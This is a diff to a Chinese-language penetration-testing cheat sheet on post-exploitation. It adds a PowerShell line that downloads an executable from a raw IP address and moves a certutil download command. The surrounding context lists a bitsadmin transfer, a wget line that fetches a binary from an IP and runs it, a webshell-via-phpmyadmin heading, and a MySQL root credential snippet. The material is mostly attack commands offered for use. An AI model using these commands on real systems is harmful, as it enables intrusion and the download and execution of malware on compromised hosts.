@@ -34,6 +34,8 @@ downloader常用方法如下：
 ·  ftfp
 
 bitsadmin /rawreturn /transfer getfile http://202.1.1.1/1.php.txt D:\1.txt
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://4.5.1.1/a.exe', '2.exe')"
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt
 
 cmd 提权常用命令
 
@@ -59,10 +61,8 @@ phpmyadmin general_log 添加webshell
 
     <T>MYSQL</T><H>localhost</H><U>root</U><P>Unser251#</P><L>utf8</L>
 
-certutil 下载:
 
-    certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt
-
+    
 linux shell 下载执行：
 
     wget  http://100.100.100.0/aelf -O /tmp/a && chmod +x /tmp/a && setsid /tmp/a
